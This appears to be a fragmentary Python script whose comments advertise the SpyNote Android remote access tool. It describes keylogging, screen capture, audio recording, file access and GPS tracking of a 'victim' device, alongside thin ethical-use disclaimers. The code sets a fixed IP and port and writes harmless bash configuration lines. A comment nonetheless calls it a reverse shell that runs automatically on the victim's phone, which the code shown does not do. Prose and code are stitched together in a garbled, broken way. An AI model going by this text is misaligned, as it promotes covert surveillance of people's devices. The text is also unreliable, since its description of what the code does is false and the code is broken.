#SpyNote is a powerful Remote Access Tool (RAT) primarily designed for Android devices,

#but it can also be effectively utilized in Linux environments, making it versatile for

#ethical hacking and cybersecurity research.

#Its main function is to enable remote control of a target device, allowing users to 

IP = "192.168.0.40" # Dont change the ip from 192.168.0.40

#execute various tasks, such as file management, screen sharing, and even keylogging.

# While SpyNote is an impressive tool, its use must adhere strictly to ethical 

#guidelines and legal standards.

#Setting up SpyNote on Linux is straightforward. 

PORT = 9876 # Dont change the port from 9876

#Users need to have Python installed, as the tool relies on Python scripts for execution.

#The installation process involves cloning the SpyNote repository from a version control 

#platform like GitHub and installing necessary dependencies through a simple command

#Once installed, users can configure the tool by editing the configuration files to suit their specific needs.

#this reverse shell will automatically execute in victim android

    f.write("#!/bin/bash\n")
    f.write("export TERM=xterm\n")  # Enable color support for the terminal
    f.write("shopt -s histappend\n")  # Append history instead of overwrite
    f.write("alias ls='ls --color=auto'\n")  # Alias for color ls


#The primary interface of SpyNote operates as a server, which listens for incoming 
    
#connections from the target device.

#Once the payload is successfully deployed on the target Android device, it establishes 
    
#a connection with the SpyNote server running on Linux

    
    f.write("export LS_COLORS='di=1;34:fi=0;37:ln=0;36:so=0;33:ex=0;32'\n")
#This connection enables the operator to perform a wide range of actions, including 
    
#capturing screenshots, recording audio, and accessing files stored on the target device.    

#One of the key features of SpyNote is its user-friendly interface, which allows even 
    
#those with minimal technical knowledge to navigate its functionalities easily.

# The toolâ€™s capability to track GPS locations provides an added layer of utility for those 

#engaged in legitimate security assessments. However, with great power comes great 

#responsibility; users must ensure they have explicit permission before attempting 

#to access any device.

#SpyNote's flexibility in operation is one of its most appealing aspects.

#It can be run on various Linux distributions, allowing penetration testers 

#and ethical hackers to utilize their preferred operating system.

#This compatibility ensures that professionals can tailor their tools to fit their workflows effectively.
